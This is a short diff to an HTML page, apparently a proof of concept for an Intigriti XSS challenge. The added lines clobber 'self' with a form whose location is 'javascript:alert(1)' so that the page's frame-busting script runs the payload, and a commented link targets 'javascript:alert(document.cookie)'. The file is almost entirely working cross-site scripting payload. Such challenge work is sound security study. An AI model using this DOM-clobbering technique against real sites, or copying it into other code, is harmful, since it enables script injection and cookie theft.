@@ -12,7 +12,12 @@
     }
     document.body.appendChild(iframe);
   </script>
-
+<form name=self location="javascript:alert(1)"></form>
+<script>
+if(top!=self){
+ top.location=self.location
+}
+</script>
 <!--   <a href="https://challenge.intigriti.io/" target="javascript:alert(document.cookie)">PoC1</a> -->
 
   </body>
